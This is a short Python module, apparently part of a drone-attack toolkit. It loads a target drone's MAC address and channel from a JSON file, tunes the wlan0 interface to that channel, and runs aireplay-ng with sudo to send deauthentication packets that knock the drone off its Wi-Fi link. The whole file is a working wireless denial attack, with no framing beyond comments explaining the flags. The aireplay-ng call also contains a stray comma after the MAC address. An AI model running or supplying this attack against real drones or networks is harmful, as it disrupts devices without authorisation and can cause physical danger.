import os
import json
from src.utils import sudo_exec

##################
### PREP MODULE ##
##################

# Get path to project root directory (two levels up from this file)
target_data_file = os.path.join(os.path.dirname(__file__), '..', '..', "data", "module_input_data.json")
scan_info = None

# Intialize target drone data
with open(target_data_file, 'r') as file:
    scan_info = json.load(file)

target_name = scan_info.get("target_name")
target_info = scan_info.get("target_info", {})

target_mac = target_info.get("mac_address")
target_channel = target_info.get("channel")
target_signal = target_info.get("signal_strength")


##################
## START MODULE ##
##################

# Targeting specific channel of target drone
sudo_exec(f"iwconfig wlan0 channel {target_channel}")

# Deauth attack command

# aireplay-ng
# -0 : Deauth attack
# 15 : Number of deauth packets to send
# -a : Target BSSID (MAC address)
# target_mac : Target BSSID (MAC) from input file
# wlan0 : Network interface to use

sudo_exec(f"aireplay-ng -0 15 -a {target_mac}, wlan0")